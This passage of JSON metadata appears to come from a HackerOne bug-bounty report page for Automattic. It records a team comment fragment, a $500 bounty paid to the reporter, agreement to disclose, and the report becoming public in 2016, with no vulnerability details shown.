shortly.\u003c/p\u003e\n","automated_response":false,"created_at":"2016-06-23T12:39:23.961Z","updated_at":"2016-06-23T12:39:23.961Z","actor":{"username":"nikolayb","cleared":false,"url":"/nikolayb","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/006/838/e07dd5308575ffd0d3b0f0650974a8482379734e_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"reporter":{"username":"jouko","url":"/jouko"},"genius_execution_id":null,"team_handle":"automattic","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1056470,"is_internal":false,"editable":false,"type":"Activities::BountyAwarded","message":"","markdown_message":"","automated_response":false,"created_at":"2016-07-06T21:43:11.216Z","updated_at":"2016-07-06T21:43:11.216Z","actor":{"url":"/automattic","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/111/7f89e1ea233f92916202521a069fdbfe9eced339_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"profile":{"name":"Automattic"}},"bounty_amount":"500.0","bounty_currency":"usd","genius_execution_id":null,"team_handle":"automattic","collaborator":{"username":"jouko","url":"/jouko"},"actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1056509,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","markdown_message":"","automated_response":false,"created_at":"2016-07-06T22:07:01.090Z","updated_at":"2016-07-06T22:07:01.090Z","first_to_agree":true,"actor":{"username":"jouko","cleared":false,"url":"/jouko","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/013/642/e4fdbdb735ac2b938c6eb072303166bc708a9a50_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"automattic","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1109118,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","markdown_message":"","automated_response":false,"created_at":"2016-08-05T22:07:08.697Z","updated_at":"2016-08-05T22:07:08.697Z","actor":{"url":"/automattic","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/111/7f89e1ea233f92916202521a069fdbfe9eced339_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"profile":{"name":"Automattic"}},"genius_execution_id":null,"team_handle":"automattic","actor_is_team_member":false,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}